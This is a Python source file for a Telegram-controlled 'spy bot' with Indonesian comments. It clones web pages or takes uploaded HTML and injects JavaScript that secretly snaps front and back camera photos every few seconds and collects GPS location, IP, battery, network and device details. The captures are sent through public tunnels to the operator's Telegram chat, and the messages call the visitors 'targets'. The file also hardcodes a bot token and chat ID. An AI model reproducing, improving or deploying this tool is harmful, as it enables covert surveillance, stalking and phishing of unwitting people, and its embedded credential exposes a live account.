#!/usr/bin/env python3
# lang: Python 3, file: say_bot.py, target: Termux / Linux
# jalankan: python say_bot.py
# dep: pip install flask requests python-telegram-bot

import os, sys, base64, datetime, threading, time
import subprocess, shutil, socket, re, signal, asyncio

try:
    from flask import Flask, request as freq, jsonify
except ImportError:
    print("[!] pip install flask"); sys.exit(1)
try:
    import requests as req_lib
except ImportError:
    print("[!] pip install requests"); sys.exit(1)
try:
    from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
    from telegram.ext import (Application, CommandHandler,
                               CallbackQueryHandler, MessageHandler,
                               ContextTypes, filters)
except ImportError:
    print("[!] pip install python-telegram-bot"); sys.exit(1)
try:
    from pyngrok import ngrok as _ngrok; PYNGROK = True
except ImportError:
    PYNGROK = False

# ------------------------------------------------------------------ #
#  KONFIGURASI
# ------------------------------------------------------------------ #
BOT_TOKEN = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
CHAT_ID   = "8598136412"

# ------------------------------------------------------------------ #
#  BANNER
# ------------------------------------------------------------------ #
RESET  = "\033[0m"
BOLD   = "\033[1m"
COLORS = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]

ASCII_ART = [
    " __  __ ____  _  _  _  _   _   _       ___ ____  ",
    "|  \\/  |  _ \\| || || || | | | | |     |_ _|  _ \\ ",
    "| |\\/| | |_) | || || || |_| |_| |      | || | | |",
    "| |  | |  _ <|__  _  __|  _  _  |      | || |_| |",
    "|_|  |_|_| \\_\\  |_| |_|  |_| |_|     |___|____/ ",
]

def print_banner():
    os.system("clear")
    print()
    for i, line in enumerate(ASCII_ART):
        color = COLORS[i % len(COLORS)]
        print(f"{BOLD}{color}{line}{RESET}")
    print(f"\n  \033[90mbot spy by MR414N-ID\033[0m\n")

# ------------------------------------------------------------------ #
#  TIMER
# ------------------------------------------------------------------ #
_start_time    = time.time()
_timer_running = True

def format_uptime():
    e = int(time.time() - _start_time)
    return f"{e//3600:02d}:{(e%3600)//60:02d}:{e%60:02d}"

def timer_thread():
    while _timer_running:
        sys.stdout.write(f"\r  \033[90m⏱  Server aktif: \033[97m{format_uptime()}\033[0m   ")
        sys.stdout.flush()
        time.sleep(1)

# ------------------------------------------------------------------ #
#  JS INJECT — data lengkap: foto berulang, lokasi, device, ip, batt, net
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var capCount = 0;
  var active   = true;
  var infoSent = false;

  function snapCamera(facingMode, cb) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { cb(null); return; }
    navigator.mediaDevices.getUserMedia({ video:{facingMode:{ideal:facingMode}}, audio:false })
    .then(function(stream){
      var v = document.createElement('video');
      v.srcObject=stream; v.setAttribute('playsinline',''); v.muted=true; v.play();
      var fired=false;
      function grab(){
        if(fired)return; fired=true;
        var c=document.createElement('canvas');
        c.width=v.videoWidth||640; c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        stream.getTracks().forEach(function(t){t.stop();});
        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
      }
      v.addEventListener('loadeddata',grab);
      setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
    }).catch(function(){cb(null);});
  }

  function getLocation(cb){
    if(!navigator.geolocation){cb(null,null,null);return;}
    navigator.geolocation.getCurrentPosition(
      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
      function(){cb(null,null,null);},
      {enableHighAccuracy:true,timeout:10000}
    );
  }

  function getNetworkInfo(){
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if(!conn) return {type:'unknown',downlink:'unknown',rtt:'unknown',effectiveType:'unknown'};
    return {
      type: conn.type || 'unknown',
      downlink: conn.downlink || 'unknown',
      rtt: conn.rtt || 'unknown',
      effectiveType: conn.effectiveType || 'unknown'
    };
  }

  function getBattery(cb){
    if(!navigator.getBattery){cb(null,null);return;}
    navigator.getBattery().then(function(b){
      cb(Math.round(b.level*100), b.charging);
    }).catch(function(){cb(null,null);});
  }

  function getPublicIP(cb){
    fetch('https://api.ipify.org?format=json',{mode:'cors'})
    .then(function(r){return r.json();})
    .then(function(d){cb(d.ip);})
    .catch(function(){cb(null);});
  }

  function collectInfo(cb){
    var info = {
      userAgent  : navigator.userAgent,
      language   : navigator.language || 'unknown',
      timezone   : Intl ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'unknown',
      screen     : window.screen.width+'x'+window.screen.height,
      platform   : navigator.platform || 'unknown',
      network    : getNetworkInfo(),
      battery_pct: null,
      charging   : null,
      ip         : null
    };
    getBattery(function(pct, chrg){
      info.battery_pct = pct;
      info.charging    = chrg;
      getPublicIP(function(ip){
        info.ip = ip;
        cb(info);
      });
    });
  }

  function doCapture(isFirst){
    if(!active) return;
    capCount++;
    var num = capCount;
    snapCamera('environment', function(back){
      snapCamera('user', function(front){
        var payload = {
          num: num,
          photo_front: front||null,
          photo_back : back||null,
          lat:null, lon:null, acc:null,
          info: null
        };
        if(isFirst){
          getLocation(function(lat,lon,acc){
            payload.lat=lat; payload.lon=lon; payload.acc=acc;
            collectInfo(function(info){
              payload.info=info;
              send(payload);
            });
          });
        } else {
          send(payload);
        }
      });
    });
  }

  function send(payload){
    fetch('/capture',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(payload)
    }).catch(function(){});
  }

  window.addEventListener('beforeunload',function(){
    active=false;
    navigator.sendBeacon('/offline','{}');
  });

  function loop(){
    if(!active)return;
    var isFirst = (capCount === 0);
    doCapture(isFirst);
    setTimeout(loop,5000);
  }

  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',loop);
  } else { loop(); }
})();
</script>
"""

# ------------------------------------------------------------------ #
#  STATE
# ------------------------------------------------------------------ #
_links        = []   # list of link dicts
_link_id_ctr  = 0
_cap_counts   = {}   # link_id -> count
_page_htmls   = {}   # link_id -> html string

# conversation state per chat
# state: None | 'await_template_choice' | 'await_url' | 'await_html'
#        | 'await_tunnel' | 'await_del'
_user_state   = {}   # chat_id -> state string
_user_data    = {}   # chat_id -> dict (temp data)

# ------------------------------------------------------------------ #
#  HELPER
# ------------------------------------------------------------------ #
def free_port(start=8080):
    p = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1",p))!=0: return p
            p+=1

def clone_url(url):
    h={"User-Agent":"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
    r=req_lib.get(url,headers=h,timeout=15); r.raise_for_status(); return r.text

def inject_html(html):
    idx=html.lower().rfind("</body>")
    return (html[:idx]+INJECT_JS+html[idx:]) if idx!=-1 else html+INJECT_JS

def parse_ua(ua):
    ua = ua or ""
    # OS
    if "Android" in ua:
        m = re.search(r"Android ([0-9.]+)", ua)
        os_name = "Android " + (m.group(1) if m else "")
    elif "iPhone" in ua or "iPad" in ua:
        m = re.search(r"OS ([0-9_]+)", ua)
        os_name = "iOS " + (m.group(1).replace("_",".") if m else "")
    elif "Windows" in ua:
        os_name = "Windows"
    elif "Mac OS" in ua:
        os_name = "macOS"
    elif "Linux" in ua:
        os_name = "Linux"
    else:
        os_name = "Unknown OS"

    # Browser
    if "Chrome" in ua and "Edg" not in ua and "OPR" not in ua:
        m = re.search(r"Chrome/([0-9]+)", ua)
        browser = "Chrome " + (m.group(1) if m else "")
    elif "Firefox" in ua:
        m = re.search(r"Firefox/([0-9]+)", ua)
        browser = "Firefox " + (m.group(1) if m else "")
    elif "Safari" in ua and "Chrome" not in ua:
        m = re.search(r"Version/([0-9]+)", ua)
        browser = "Safari " + (m.group(1) if m else "")
    elif "Edg" in ua:
        m = re.search(r"Edg/([0-9]+)", ua)
        browser = "Edge " + (m.group(1) if m else "")
    elif "OPR" in ua or "Opera" in ua:
        browser = "Opera"
    else:
        browser = "Unknown Browser"

    device = "Mobile" if ("Mobile" in ua or "Android" in ua or "iPhone" in ua) else "Desktop"
    return os_name, browser, device

# ------------------------------------------------------------------ #
#  KIRIM HASIL KE TELEGRAM
# ------------------------------------------------------------------ #
def send_result_thread(data, link_id):
    asyncio.run(_send_result(data, link_id))

async def _send_result(data, link_id):
    bot   = Bot(token=BOT_TOKEN)
    num   = data.get("num","?")
    lat   = data.get("lat"); lon=data.get("lon"); acc=data.get("acc")
    front = data.get("photo_front"); back=data.get("photo_back")
    info  = data.get("info") or {}
    ts    = datetime.datetime.now().strftime("%H:%M:%S")

    # update counter
    _cap_counts[link_id] = _cap_counts.get(link_id, 0) + 1
    total = _cap_counts[link_id]

    # notif pertama masuk
    if total == 1:
        await bot.send_message(
            chat_id=CHAT_ID,
            text=f"🎯 *Target masuk!* — Link #{link_id}\n⏰ {ts}",
            parse_mode="Markdown"
        )

    # parse UA
    ua = info.get("userAgent","")
    os_name, browser, device = parse_ua(ua)

    # network
    net  = info.get("network") or {}
    ntype = net.get("type","?"); neff = net.get("effectiveType","?")
    net_str = f"{ntype} ({neff})" if ntype != "?" else neff

    # battery
    batt = info.get("battery_pct")
    chrg = info.get("charging")
    batt_str = f"{batt}% {'🔌' if chrg else '🔋'}" if batt is not None else "?"

    # build pesan
    teks = f"📸 *Capture #{num}* (Link #{link_id}) — {ts}\n"
    teks += f"📊 Total capture link ini: {total}\n\n"

    if lat and lon:
        maps = f"https://maps.google.com/?q={lat},{lon}"
        teks += f"📍 `{lat}, {lon}` ± {int(float(acc))}m\n[Buka Maps]({maps})\n\n"
    else:
        teks += "📍 Lokasi tidak didapat\n\n"

    teks += f"📱 *Device:* {device} — {os_name}\n"
    teks += f"🌐 *Browser:* {browser}\n"
    teks += f"🔌 *IP:* `{info.get('ip','?')}`\n"
    teks += f"📡 *Network:* {net_str}\n"
    teks += f"🔋 *Battery:* {batt_str}\n"
    teks += f"🕐 *Timezone:* {info.get('timezone','?')}\n"
    teks += f"🗣 *Bahasa:* {info.get('language','?')}\n"
    teks += f"🖥 *Layar:* {info.get('screen','?')}"

    await bot.send_message(chat_id=CHAT_ID, text=teks, parse_mode="Markdown")

    # pin lokasi (hanya capture pertama)
    if num == 1 and lat and lon:
        await bot.send_location(chat_id=CHAT_ID,
                                latitude=float(lat), longitude=float(lon))

    # foto back
    if back:
        try:
            await bot.send_photo(chat_id=CHAT_ID,
                                 photo=base64.b64decode(back),
                                 caption=f"📷 Belakang — Link #{link_id} Cap #{num}")
        except Exception as e: print(f"\n[!] foto back: {e}")

    # foto front
    if front:
        try:
            await bot.send_photo(chat_id=CHAT_ID,
                                 photo=base64.b64decode(front),
                                 caption=f"🤳 Depan — Link #{link_id} Cap #{num}")
        except Exception as e: print(f"\n[!] foto front: {e}")

async def _send_offline(link_id):
    bot = Bot(token=BOT_TOKEN)
    total = _cap_counts.get(link_id, 0)
    await bot.send_message(
        chat_id=CHAT_ID,
        text=f"🔴 *Target offline* (Link #{link_id})\nTotal capture: {total}",
        parse_mode="Markdown"
    )

# ------------------------------------------------------------------ #
#  FLASK — satu app per link
# ------------------------------------------------------------------ #
def make_flask_app(link_id):
    fapp = Flask(f"app_{link_id}")

    @fapp.route("/")
    def index():
        return _page_htmls.get(link_id, "<h1>Not found</h1>")

    @fapp.route("/capture", methods=["POST"])
    def capture():
        data = freq.get_json(silent=True) or {}
        threading.Thread(
            target=send_result_thread, args=(data, link_id), daemon=True
        ).start()
        return jsonify({"ok": True})

    @fapp.route("/offline", methods=["POST"])
    def offline():
        asyncio.run(_send_offline(link_id))
        return jsonify({"ok": True})

    return fapp

def run_flask_on_port(fapp, port):
    fapp.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ------------------------------------------------------------------ #
#  TUNNEL
# ------------------------------------------------------------------ #
def start_cloudflared(port):
    b = shutil.which("cloudflared")
    if not b: return None, None
    proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1)
    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
    for _ in range(40):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

def start_ngrok(port):
    if PYNGROK:
        try:
            t = _ngrok.connect(port,"http")
            return t.public_url.replace("http://","https://"), None
        except Exception as e: print(f"\n[!] ngrok: {e}")
    if shutil.which("ngrok"):
        proc = subprocess.Popen(["ngrok","http",str(port)],
                                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        time.sleep(3)
        try:
            r=req_lib.get("http://127.0.0.1:4040/api/tunnels",timeout=3)
            for t in r.json().get("tunnels",[]):
                u=t.get("public_url","")
                if u.startswith("https"): return u, proc
        except: pass
    return None, None

def start_serveo(port):
    if not shutil.which("ssh"): return None, None
    proc = subprocess.Popen(
        ["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=30",
         "-R",f"80:localhost:{port}","serveo.net"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    pat = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
    for _ in range(30):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

TUNNEL_FN = {
    "cf": start_cloudflared,
    "ng": start_ngrok,
    "sv": start_serveo,
}

# ------------------------------------------------------------------ #
#  KEYBOARD
# ------------------------------------------------------------------ #
def kb_main():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("➕ Tambah Link", callback_data="add_link"),
            InlineKeyboardButton("🗑 Hapus Link",  callback_data="del_link"),
        ],
        [
            InlineKeyboardButton("📋 Daftar Link", callback_data="list_links"),
            InlineKeyboardButton("🛑 Stop Server", callback_data="stop"),
        ],
    ])

def kb_template():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔗 Clone URL",      callback_data="tmpl_url"),
            InlineKeyboardButton("📄 Kirim File HTML", callback_data="tmpl_html"),
        ],
        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
    ])

def kb_tunnel():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("☁️ Cloudflared", callback_data="tun_cf"),
        InlineKeyboardButton("🔗 Ngrok",       callback_data="tun_ng"),
        InlineKeyboardButton("🌐 Serveo",      callback_data="tun_sv"),
    ],[
        InlineKeyboardButton("« Kembali", callback_data="back_main"),
    ]])

def kb_del():
    rows = []
    for lnk in _links:
        cap = _cap_counts.get(lnk["id"], 0)
        rows.append([InlineKeyboardButton(
            f"🗑 Link #{lnk['id']} ({cap} cap) — {lnk['pub_url'][:35]}...",
            callback_data=f"delid_{lnk['id']}"
        )])
    rows.append([InlineKeyboardButton("« Kembali", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)

# ------------------------------------------------------------------ #
#  SPAWN LINK
# ------------------------------------------------------------------ #
async def spawn_link(tunnel_key, raw_html, query):
    global _link_id_ctr
    _link_id_ctr += 1
    lid  = _link_id_ctr
    port = free_port(8080 + lid * 10)

    _page_htmls[lid] = inject_html(raw_html)
    _cap_counts[lid] = 0

    await query.edit_message_text(f"⏳ Membuat link #{lid}...")

    fapp = make_flask_app(lid)
    threading.Thread(target=run_flask_on_port, args=(fapp, port), daemon=True).start()
    time.sleep(1.0)

    loop = asyncio.get_event_loop()
    fn   = TUNNEL_FN[tunnel_key]
    pub_url, proc = await loop.run_in_executor(None, fn, port)

    if not pub_url:
        await query.edit_message_text(
            f"❌ Tunnel gagal untuk link #{lid}.",
            reply_markup=kb_main()
        )
        return

    _links.append({"id": lid, "pub_url": pub_url, "port": port, "proc": proc})

    await query.edit_message_text(
        f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
        parse_mode="Markdown",
        reply_markup=kb_main()
    )

# ------------------------------------------------------------------ #
#  HANDLERS
# ------------------------------------------------------------------ #
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = str(update.effective_chat.id)
    _user_state[cid] = None
    _user_data[cid]  = {}
    await update.message.reply_text(
        "🕵️ *MR414N-ID Spy Bot*\n\nPanel kontrol:",
        parse_mode="Markdown",
        reply_markup=kb_main()
    )

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    cid = str(q.message.chat_id)
    d   = q.data
    await q.answer()

    if d == "back_main":
        _user_state[cid] = None
        _user_data[cid]  = {}
        await q.edit_message_text(
            "🕵️ *MR414N-ID Spy Bot*\n\nPanel kontrol:",
            parse_mode="Markdown", reply_markup=kb_main()
        )

    elif d == "add_link":
        _user_state[cid] = "await_template"
        _user_data[cid]  = {}
        await q.edit_message_text(
            "Pilih template untuk link baru:",
            reply_markup=kb_template()
        )

    elif d == "tmpl_url":
        _user_state[cid] = "await_url"
        await q.edit_message_text(
            "Ketik URL yang mau di-clone:\n(contoh: https://google.com)"
        )

    elif d == "tmpl_html":
        _user_state[cid] = "await_html"
        await q.edit_message_text(
            "Kirim file `.html` sekarang di chat ini."
        )

    elif d in ("tun_cf","tun_ng","tun_sv"):
        raw = _user_data.get(cid, {}).get("raw_html","")
        if not raw:
            await q.edit_message_text("❌ Template kosong, mulai ulang.", reply_markup=kb_main())
            return
        key = d.replace("tun_","")
        await spawn_link(key, raw, q)
        _user_state[cid] = None
        _user_data[cid]  = {}

    elif d == "list_links":
        if not _links:
            await q.edit_message_text("📋 Belum ada link aktif.", reply_markup=kb_main())
        else:
            teks = "📋 *Daftar Link Aktif:*\n\n"
            for lnk in _links:
                cap = _cap_counts.get(lnk["id"], 0)
                teks += f"• Link #{lnk['id']} ({cap} capture)\n`{lnk['pub_url']}`\n\n"
            await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main())

    elif d == "del_link":
        if not _links:
            await q.edit_message_text("Belum ada link untuk dihapus.", reply_markup=kb_main())
        else:
            await q.edit_message_text("Pilih link yang mau dihapus:", reply_markup=kb_del())

    elif d.startswith("delid_"):
        lid = int(d.split("_")[1])
        for i, lnk in enumerate(_links):
            if lnk["id"] == lid:
                if lnk.get("proc"):
                    try: lnk["proc"].terminate()
                    except: pass
                _links.pop(i)
                _page_htmls.pop(lid, None)
                break
        await q.edit_message_text(f"✅ Link #{lid} dihapus.", reply_markup=kb_main())

    elif d == "stop":
        await q.edit_message_text("🛑 *Server dihentikan.*", parse_mode="Markdown")
        await asyncio.sleep(1)
        global _timer_running
        _timer_running = False
        os.kill(os.getpid(), signal.SIGINT)

async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid  = str(update.effective_chat.id)
    state = _user_state.get(cid)

    if state == "await_url":
        url = update.message.text.strip()
        if not url.startswith("http"): url = "https://" + url
        await update.message.reply_text(f"⏳ Cloning {url} ...")
        try:
            raw = clone_url(url)
            _user_data[cid]["raw_html"] = raw
            _user_state[cid] = "await_tunnel"
            await update.message.reply_text(
                "✅ Clone berhasil!\n\nPilih tunnel:",
                reply_markup=kb_tunnel()
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ Gagal clone: {e}\n\nCoba lagi atau kembali.",
                reply_markup=kb_template()
            )

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid   = str(update.effective_chat.id)
    state = _user_state.get(cid)

    if state == "await_html":
        doc = update.message.document
        if not doc.file_name.endswith(".html"):
            await update.message.reply_text("❌ Harus file .html")
            return
        await update.message.reply_text("⏳ Memproses file...")
        try:
            tfile = await context.bot.get_file(doc.file_id)
            raw_bytes = await tfile.download_as_bytearray()
            raw = raw_bytes.decode("utf-8", errors="replace")
            _user_data[cid]["raw_html"] = raw
            _user_state[cid] = "await_tunnel"
            await update.message.reply_text(
                "✅ File diterima!\n\nPilih tunnel:",
                reply_markup=kb_tunnel()
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Gagal baca file: {e}")

# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    print_banner()
    threading.Thread(target=timer_thread, daemon=True).start()
    print(f"\n\n  Buka @Spyjsbot → /start\n")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
